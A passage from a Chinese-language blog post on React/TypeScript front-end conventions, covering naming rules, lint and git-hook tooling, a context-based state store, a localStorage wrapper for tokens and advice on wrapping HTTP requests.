<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; memo, useMemo &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ITitleProps</span> &#123;</span><br><span class="line">  <span class="attr">title</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Title</span>: <span class="title class_">React</span>.<span class="property">FC</span>&lt;<span class="title class_">ITitleProps</span>&gt; = <span class="function"><span class="params">props</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; title &#125; = props</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;title&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">memo</span>(<span class="title class_">Title</span>)</span><br></pre></td></tr></table></figure>

<p><strong>「ITitleProps」</strong> 以<strong>「I」</strong>为开头代表<strong>「类型」</strong>，中间为语义化<strong>「Title」</strong>，后面<strong>「Props」</strong>为类型，代表是组件参数。</p>
<h3 id="定义接口"><a href="#定义接口" class="headerlink" title="定义接口"></a>定义接口</h3><p>例1: 登录接口，定义好参数类型和响应数据类型，参数类型直接定义<strong>「params」</strong>的类型，响应数据放在<strong>「范型」</strong>里面，需要在封装的时候就处理好这个范型。</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; request &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/request&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** 公共的接口响应范型 */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">HttpSuccessResponse</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="attr">code</span>: <span class="built_in">number</span></span><br><span class="line">  <span class="attr">message</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">data</span>: T</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 登录接口参数 */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">ILoginParams</span> &#123;</span><br><span class="line">  <span class="attr">username</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">password</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 登录接口响应 */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">ILoginData</span> &#123;</span><br><span class="line">  <span class="attr">token</span>: <span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 用户登录接口 */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">loginApi</span> = (<span class="params">params: ILoginApi</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> request.<span class="property">post</span>&lt;<span class="title class_">ILoginData</span>&gt;(<span class="string">&#x27;/xxx&#x27;</span>, params)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p>以<strong>「on」</strong>开头代表事件，这个只是规范，<strong>「on」</strong>要比<strong>「handle」</strong>短一点，哈哈。</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">onChange</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="工具约束代码规范"><a href="#工具约束代码规范" class="headerlink" title="工具约束代码规范"></a>工具约束代码规范</h3><p>除了约定俗称的规范，我们也需要借助一些工具和插件来协助我们更好的完成规范这件事情。</p>
<h4 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h4><ol>
<li>vscode：统一前端编辑器。</li>
<li>editorconfig: 统一团队<strong>「vscode」</strong>编辑器默认配置。</li>
<li>prettier: 保存文件自动格式化代码。</li>
<li>eslint: 检测代码语法规范和错误。</li>
<li>stylelint: 检测和格式化样式文件语法</li>
</ol>
<p>了解更多，<a href="https://juejin.cn/post/7101596844181962788">详见</a></p>
<h3 id="git提交规范"><a href="#git提交规范" class="headerlink" title="git提交规范"></a>git提交规范</h3><ol>
<li>husky:可以监听githooks执行，在对应<strong>「hook」</strong>执行阶段做一些处理的操作。</li>
<li>lint-staged: 只检测暂存区文件代码，优化<strong>「eslint」</strong>检测速度。</li>
<li>pre-commit：<strong>「githooks」</strong>之一， 在<strong>「commit」</strong>提交前使用<strong>「tsc」</strong>和<strong>「eslint」</strong>对语法进行检测。</li>
<li>commit-msg：<strong>「githooks」</strong>之一，在<strong>「commit」</strong>提交前对<strong>「commit」</strong>备注信息进行检测。</li>
<li>commitlint：在<strong>「githooks」</strong>的<strong>「pre-commit」</strong>阶段对<strong>「commit」</strong>备注信息进行检测。</li>
<li>commitizen：<strong>「git」</strong>的规范化提交工具，辅助填写<strong>「commit」</strong>信息。</li>
</ol>
<p>了解更多，<a href="https://juejin.cn/post/7101596844181962788">详见</a></p>
<h2 id="状态管理器优化和统一"><a href="#状态管理器优化和统一" class="headerlink" title="状态管理器优化和统一"></a>状态管理器优化和统一</h2><h3 id="优化状态管理"><a href="#优化状态管理" class="headerlink" title="优化状态管理"></a>优化状态管理</h3><p>用<strong>「react」</strong>的<strong>「context」</strong>封装了一个简单的状态管理器，有完整的类型提升，支持在组件内和外部使用，也发布到npm(<a href="https://www.npmjs.com/package/reactx-atom-store)%E4%BA%86">https://www.npmjs.com/package/reactx-atom-store)了</a></p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; createContext,  useContext, <span class="title class_">ComponentType</span>, <span class="title class_">ComponentProps</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** 创建context组合useState状态Store */</span></span><br><span class="line"><span class="keyword">function</span> createStore&lt;T&gt;(<span class="attr">store</span>: <span class="function">() =&gt;</span> T) &#123;</span><br><span class="line">  <span class="comment">// eslint-disable-next-line</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">ModelContext</span>: <span class="built_in">any</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 使用model */</span></span><br><span class="line">  <span class="keyword">function</span> useModel&lt;K <span class="keyword">extends</span> keyof T&gt;(<span class="attr">key</span>: K) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">useContext</span>(<span class="title class_">ModelContext</span>[key]) <span class="keyword">as</span> T[K];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 当前的状态 */</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">currentStore</span>: T;</span><br><span class="line">  <span class="comment">/** 上一次的状态 */</span></span><br><span class="line">  <span class="keyword">let</span> <span class="attr">prevStore</span>: T;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 创建状态注入组件 */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">StoreProvider</span>(<span class="params">props: &#123; children: React.ReactNode &#125;</span>) &#123;</span><br><span class="line">    currentStore = <span class="title function_">store</span>();</span><br><span class="line">    <span class="comment">/** 如果有上次的context状态，做一下浅对比，</span></span><br><span class="line"><span class="comment">     * 如果状态没变，就复用上一次context的value指针，避免context重新渲染</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (prevStore) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> prevStore) &#123;</span><br><span class="line">        <span class="comment">// @ts-ignore</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">shallow</span>(prevStore[key], currentStore[key])) &#123;</span><br><span class="line">          <span class="comment">// @ts-ignore</span></span><br><span class="line">          currentStore[key] = prevStore[key];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    prevStore = currentStore;</span><br><span class="line">    <span class="comment">// @ts-ignore</span></span><br><span class="line">    <span class="keyword">let</span> <span class="attr">keys</span>: <span class="built_in">any</span>[] = <span class="title class_">Object</span>.<span class="title function_">keys</span>(currentStore);</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> length = keys.<span class="property">length</span>;</span><br><span class="line">    <span class="comment">/** 遍历状态，递归形成多层级嵌套Context */</span></span><br><span class="line">    <span class="keyword">function</span> getContext&lt;T, K <span class="keyword">extends</span> keyof T&gt;(</span><br><span class="line">      <span class="attr">key</span>: K,</span><br><span class="line">      <span class="attr">val</span>: T,</span><br><span class="line">      <span class="attr">children</span>: <span class="title class_">React</span>.<span class="property">ReactNode</span>,</span><br><span class="line">    ): <span class="variable constant_">JSX</span>.<span class="property">Element</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="title class_">Context</span> =</span><br><span class="line">        <span class="title class_">ModelContext</span>[key] || (<span class="title class_">ModelContext</span>[key] = <span class="title function_">createContext</span>(val[key]));</span><br><span class="line">      <span class="keyword">const</span> currentIndex = ++i;</span><br><span class="line">      <span class="comment">/** 返回嵌套的Context */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">React</span>.<span class="title function_">createElement</span>(</span><br><span class="line">        <span class="title class_">Context</span>.<span class="property">Provider</span>,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">value</span>: val[key],</span><br><span class="line">        &#125;,</span><br><span class="line">        currentIndex &lt; length</span><br><span class="line">          ? <span class="title function_">getContext</span>(keys[currentIndex], val, children)</span><br><span class="line">          : children,</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getContext</span>(keys[i], currentStore, props.<span class="property">children</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 获取当前状态, 方便在组件外部使用,也不会引起页面更新 */</span></span><br><span class="line">  <span class="keyword">function</span> getModel&lt;K <span class="keyword">extends</span> keyof T&gt;(<span class="attr">key</span>: K): T[K] &#123;</span><br><span class="line">    <span class="keyword">return</span> currentStore[key];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 连接Model注入到组件中 */</span></span><br><span class="line">  <span class="keyword">function</span> connectModel&lt;<span class="title class_">Selected</span>, K <span class="keyword">extends</span> keyof T&gt;(</span><br><span class="line">    <span class="attr">key</span>: K,</span><br><span class="line">    <span class="attr">selector</span>: <span class="function">(<span class="params">state: T[K]</span>) =&gt;</span> <span class="title class_">Selected</span>,</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">// eslint-disable-next-line func-names</span></span><br><span class="line">    <span class="comment">// @ts-ignore</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> &lt;P, C <span class="keyword">extends</span> <span class="title class_">ComponentType</span>&lt;<span class="built_in">any</span>&gt;&gt;(</span><br><span class="line">      <span class="title class_">WarpComponent</span>: C,</span><br><span class="line">    ): <span class="title class_">ComponentType</span>&lt;<span class="title class_">Omit</span>&lt;<span class="title class_">ComponentProps</span>&lt;C&gt;, keyof <span class="title class_">Selected</span>&gt;&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="title function_">Connect</span> = (<span class="params">props: P</span>) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> val = <span class="title function_">useModel</span>(key);</span><br><span class="line">        <span class="keyword">const</span> state = <span class="title function_">selector</span>(val);</span><br><span class="line">        <span class="comment">// @ts-ignore</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">React</span>.<span class="title function_">createElement</span>(<span class="title class_">WarpComponent</span>, &#123;</span><br><span class="line">          ...props,</span><br><span class="line">          ...state,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Connect</span> <span class="keyword">as</span> <span class="built_in">unknown</span> <span class="keyword">as</span> <span class="title class_">ComponentType</span>&lt;</span><br><span class="line">        <span class="title class_">Omit</span>&lt;<span class="title class_">ComponentProps</span>&lt;C&gt;, keyof <span class="title class_">Selected</span>&gt;</span><br><span class="line">      &gt;;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    useModel,</span><br><span class="line">    connectModel,</span><br><span class="line">    <span class="title class_">StoreProvider</span>,</span><br><span class="line">    getModel,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> createStore</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 浅对比对象 */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title class_">Shallow</span>&lt;T&gt;(<span class="attr">obj1</span>: T, <span class="attr">obj2</span>: T) &#123;</span><br><span class="line">  <span class="keyword">if</span>(obj1 === obj2) <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Object</span>.<span class="title function_">keys</span>(obj1).<span class="property">length</span> !== <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj2).<span class="property">length</span>) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> key <span class="keyword">in</span> obj1) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj1[key] !== obj2[key]) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="store目录结构"><a href="#store目录结构" class="headerlink" title="store目录结构"></a>store目录结构</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">├─src               <span class="comment">#  项目目录</span></span><br><span class="line">│  ├─store              <span class="comment">#  全局状态管理</span></span><br><span class="line">│  │  └─modules           <span class="comment">#  状态modules</span></span><br><span class="line">│  │    └─user.ts           <span class="comment">#  用户信息状态</span></span><br><span class="line">│  │    ├─other.ts          <span class="comment">#  其他全局状态</span></span><br><span class="line">│  │  ├─createStore.ts          <span class="comment">#  封装的状态管理器</span></span><br><span class="line">│  │  └─index.ts          <span class="comment">#  store入口页面</span></span><br></pre></td></tr></table></figure>

<h3 id="定义状态管理器"><a href="#定义状态管理器" class="headerlink" title="定义状态管理器"></a>定义状态管理器</h3><p>在store&#x2F;index.ts中引入</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** 1. 引入createStore.ts */</span></span><br><span class="line"><span class="keyword">import</span> createStore <span class="keyword">from</span> <span class="string">&#x27;./createStore&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** 2. 定义各个状态 */</span></span><br><span class="line"><span class="comment">// user</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">userModel</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [ userInfo, setUserInfo ] = useState&lt;&#123; <span class="attr">name</span>: <span class="built_in">string</span> &#125;&gt;(&#123; <span class="attr">name</span>: <span class="string">&#x27;name&#x27;</span> &#125;)</span><br><span class="line">  <span class="keyword">return</span> &#123; userInfo, setUserInfo &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// other</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">otherModel</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [ other, setOther ] = useState&lt;<span class="built_in">number</span>&gt;(<span class="number">20</span>)</span><br><span class="line">  <span class="keyword">return</span> &#123; other, setOther &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 3. 组合所有状态 */</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="title function_">createStore</span>(<span class="function">() =&gt;</span> (&#123;</span><br><span class="line">  <span class="attr">user</span>: <span class="title function_">userModel</span>(),</span><br><span class="line">  <span class="attr">other</span>: <span class="title function_">otherModel</span>(),</span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 向外暴露useModel, StoreProvider, getModel, connectModel */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> &#123; useModel, <span class="title class_">StoreProvider</span>, getModel, connectModel &#125; = store</span><br></pre></td></tr></table></figure>

<p>在顶层通过StoreProvider注入状态</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src/main.ts</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&#x27;react-dom&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;@/App&#x27;</span></span><br><span class="line"><span class="comment">// 1. 引入StoreProvider</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">StoreProvider</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用StoreProvider包裹App组件</span></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">StoreProvider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">App</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">StoreProvider</span>&gt;</span></span>,</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h3 id="使用状态管理器"><a href="#使用状态管理器" class="headerlink" title="使用状态管理器"></a>使用状态管理器</h3><p>在函数组件中使用，借助useModel</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; useModel &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">FunctionDemo</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 通过useModel取出user状态 */</span></span><br><span class="line">  <span class="keyword">const</span> &#123; userInfo, setUserInfo &#125; = <span class="title function_">useModel</span>(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** 在点击事件中调用setUserInfo改变状态 */</span></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">onChangeUser</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">setUserInfo</span>(&#123;</span><br><span class="line">      <span class="attr">name</span>: userInfo.<span class="property">name</span> + <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 展示userInfo.name</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onChangeUser&#125;</span>&gt;</span>&#123;userInfo.name&#125;--改变user中的状态<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">FunctionDemo</span></span><br></pre></td></tr></table></figure>

<p>在class组件中使用,借助connectModel</p>
<figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; connectModel &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义class组件props</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IClassDemoProps</span> &#123;</span><br><span class="line">  <span class="attr">setOther</span>: <span class="title class_">React</span>.<span class="property">Dispatch</span>&lt;<span class="title class_">React</span>.<span class="property">SetStateAction</span>&lt;<span class="built_in">string</span>&gt;&gt;</span><br><span class="line">  <span class="attr">other</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassDemo</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span>&lt;<span class="title class_">IClassDemoProps</span>&gt; &#123;</span><br><span class="line">  <span class="comment">// 通过this.props获取到方法修改状态</span></span><br><span class="line">  onChange = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">props</span>.<span class="title function_">setOther</span>(<span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">other</span> + <span class="number">1</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 通过this.props获取到状态进行展示</span></span><br><span class="line">    <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.onChange&#125;</span>&gt;</span>&#123;this.props.other&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过高阶组件connectModel把other状态中的属性和方法注入到类组件中</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">connectModel</span>(<span class="string">&#x27;other&#x27;</span>,<span class="function"><span class="params">state</span> =&gt;</span> (&#123;</span><br><span class="line">  <span class="attr">other</span>: state.<span class="property">other</span>,</span><br><span class="line">  <span class="attr">setOther</span>: state.<span class="property">setOther</span></span><br><span class="line">&#125;))(<span class="title class_">ClassDemo</span>)</span><br></pre></td></tr></table></figure>

<p>在组件外使用, 借助getModel</p>
<p>也可以在组件内读取修改状态方法，不回引起更新</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getModel &#125; <span class="keyword">from</span> <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">onChangeUser</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// 通过getModel读取usel状态，进行操作</span></span><br><span class="line">  <span class="keyword">const</span> user = <span class="title function_">getModel</span>(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">  user.<span class="title function_">setUserInfo</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: user.<span class="property">userInfo</span>.<span class="property">name</span> + <span class="string">&#x27;1&#x27;</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1秒后执行onChangeUser方法</span></span><br><span class="line"><span class="built_in">setTimeout</span>(onChangeUser, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>

<h2 id="本地存储统一管理"><a href="#本地存储统一管理" class="headerlink" title="本地存储统一管理"></a>本地存储统一管理</h2><p>可以对<strong>「localStorage」</strong>和<strong>「sessionStorage」</strong>还有<strong>「cookie」</strong>简单封装一下，封装后使用的好处：</p>
<ol>
<li>自动序列化，存储的时候转字符串，取得时候再转回来。</li>
<li>类型自动推断，在实例化的时候传入类型，在设置和获取值的时候都会自动类型推断。</li>
<li>可以统一管理，把本地存储都放在一个文件里面，避免后期本地存储混乱不好维护问题。</li>
<li>抹平平台差异，这个思路<strong>「web」</strong>，小程序，移动端，桌面端都适合。</li>
</ol>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> prefix = <span class="string">&#x27;xxx.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IStorage</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="attr">key</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">defaultValue</span>: T</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Storage</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">IStorage</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="attr">key</span>: <span class="built_in">string</span></span><br><span class="line">  <span class="attr">defaultValue</span>: T</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">key, defaultValue</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">key</span> = prefix + key</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">defaultValue</span> = defaultValue</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/** 设置值 */</span></span><br><span class="line">  <span class="title function_">setItem</span>(<span class="params">value: T</span>) &#123;</span><br><span class="line">    <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="variable language_">this</span>.<span class="property">key</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(value))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/** 获取值 */</span></span><br><span class="line">  <span class="title function_">getItem</span>(): T &#123;</span><br><span class="line">    <span class="keyword">const</span> value = <span class="variable language_">localStorage</span>[<span class="variable language_">this</span>.<span class="property">key</span>] &amp;&amp; <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="variable language_">this</span>.<span class="property">key</span>)</span><br><span class="line">    <span class="keyword">if</span> (value === <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">defaultValue</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> value &amp;&amp; value !== <span class="string">&#x27;null&#x27;</span> &amp;&amp; value !== <span class="string">&#x27;undefined&#x27;</span></span><br><span class="line">        ? (<span class="title class_">JSON</span>.<span class="title function_">parse</span>(value) <span class="keyword">as</span> T)</span><br><span class="line">        : <span class="variable language_">this</span>.<span class="property">defaultValue</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">      <span class="keyword">return</span> value &amp;&amp; value !== <span class="string">&#x27;null&#x27;</span> &amp;&amp; value !== <span class="string">&#x27;undefined&#x27;</span></span><br><span class="line">        ? (value <span class="keyword">as</span> <span class="built_in">unknown</span> <span class="keyword">as</span> T)</span><br><span class="line">        : <span class="variable language_">this</span>.<span class="property">defaultValue</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/** 删除值 */</span></span><br><span class="line">  <span class="title function_">removeItem</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">localStorage</span>.<span class="title function_">removeItem</span>(<span class="variable language_">this</span>.<span class="property">key</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 管理token */</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> tokenStorage = <span class="keyword">new</span> <span class="title class_">Storage</span>&lt;<span class="built_in">string</span>&gt;(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="封装请求统一和项目解耦"><a href="#封装请求统一和项目解耦" class="headerlink" title="封装请求统一和项目解耦"></a>封装请求统一和项目解耦</h2><h3 id="现有的封装"><a href="#现有的封装" class="headerlink" title="现有的封装"></a>现有的封装</h3><p>项目现用的请求封装和项目业务逻辑耦合在一块，不方便直接复用，使用上比较麻烦，每次需要传<strong>「GET」</strong>和<strong>「POST」</strong>类型，<strong>「GET」</strong>参数要每次单独做处理，参数类型限制弱。</p>
<h3 id="推荐使用"><a href="#推荐使用" class="headerlink" title="推荐使用"></a>推荐使用</h3><p>推荐直接使用<strong>「fetch」</strong>封装或<strong>「axios」</strong>，项目中基于次做二次封装，只关注和项目有关的逻辑，不关注请求的实现逻辑。在请求异常的时候不返回<strong>「Promise.reject()**「，而是返回一个对象，只是」**code」**改为异常状态的</strong>「code」<strong>，这样在页面中使用时，不用用</strong>「try&#x2F;catch」<strong>包裹，只用</strong>「if」<strong>判断</strong>「code」**是否正确就可以。</p>
